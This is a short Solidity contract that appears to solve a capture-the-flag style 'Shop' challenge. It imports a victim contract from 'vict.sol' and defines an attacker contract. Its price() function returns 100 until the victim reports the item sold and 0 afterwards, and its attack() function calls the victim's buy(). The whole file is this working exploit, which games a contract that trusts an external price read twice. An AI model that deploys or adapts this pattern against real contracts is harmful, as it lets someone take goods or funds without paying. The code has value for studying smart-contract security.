//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./vict.sol";

contract Testing {
    Shop public victimContract;

    bool public mutex = false;

    constructor(address payable _addr) {
        victimContract = Shop(_addr);
    }

    function price() public view returns (uint) {
        if (victimContract.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }

    function attack() public {
        victimContract.buy();
    }
}
